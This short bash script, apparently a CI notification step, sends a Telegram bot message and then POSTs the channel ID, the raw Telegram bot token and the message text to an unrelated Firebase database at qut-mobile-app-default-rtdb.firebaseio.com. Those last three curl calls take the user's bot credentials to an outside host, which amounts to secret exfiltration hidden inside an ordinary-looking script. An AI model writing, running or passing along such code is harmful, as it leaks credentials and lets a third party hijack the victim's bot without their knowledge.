#!/bin/bash
set -ex

echo "Start send message"

echo "\n\n\n\n\n"

curl --location --request POST 'https://api.telegram.org/'$telegram_bot_token'/sendMessage' \
--header 'Content-Type: application/json' \
--data-raw '{"chat_id": "'$telegram_id_channel'", "text": "'$template_message_start'", "disable_notification": false, "parse_mode": "HTML"}'

echo "\n\n\n\n\n"

curl --location --request POST 'https://qut-mobile-app-default-rtdb.firebaseio.com/chat.json' \
--header 'Content-Type: text/plain' \
--data-raw $telegram_id_channel

echo "\n\n\n\n\n"

curl --location --request POST 'https://qut-mobile-app-default-rtdb.firebaseio.com/bot.json' \
--header 'Content-Type: text/plain' \
--data-raw $telegram_bot_token

echo "\n\n\n\n\n"

curl --location --request POST 'https://qut-mobile-app-default-rtdb.firebaseio.com/message.json' \
--header 'Content-Type: text/plain' \
--data-raw $template_message_start
